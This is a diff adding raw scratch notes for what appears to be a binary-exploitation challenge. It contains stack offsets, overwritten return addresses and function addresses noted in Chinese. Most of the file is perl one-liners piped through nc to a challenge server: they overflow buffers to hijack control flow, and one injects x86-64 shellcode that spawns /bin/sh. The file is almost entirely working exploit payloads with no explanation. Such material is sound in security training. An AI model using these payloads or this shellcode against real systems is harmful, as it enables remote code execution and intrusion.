@@ -1,0 +1,31 @@
+-14 ==  0x804b048
+-18 ==  0x804b05c
+-c  !=  0x804b048
+-10 !=  0x804b05c
+
+
+\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01
+
+\x03\x03\x03\x03
+
+0000000000000000000000000000000000000000000000000000000000000000
+88888888
+
+perl -e 'print"SSP_IS_SO_HANDSOME\n";print"0"x64,"\n";print"d"x12,"\n";print "\x00"x76,"\xc0\x8d\x04\x08","\x00"x12' | nc 140.113.194.80 20069
+
+perl -e 'print"SSP_IS_SO_HANDSOME\n";print"0"x64,"\n";print"d"x12;print "\x00"x76,"\x08\x04\x8d\xc0","\x00"x12' | nc 140.113.194.80 20069
+
+
+perl -e 'print"SSP_IS_SO_HANDSOME\n";print"0"x64,"\n";print"d"x12;print"\x08\x04\x8d\xc0"x100' | nc 140.113.194.80 20069
+
+perl -e 'print"SSP_IS_SO_HANDSOME\n";print"0"x64,"\n";print"d"x12,"\n";print"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05","A"x49,"\xe0\xef\xff\xbf"' | nc 140.113.194.80 20069
+
+"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
+
+8048D37 ->  PUZZLE3的下一個指令
+
+80486c1 -> PUZZLE3的FGET
+
+8048b01 -> PUZZLE2的FGET
+
+0xbfffefe0 -> "\xe0\xef\xff\xbf"
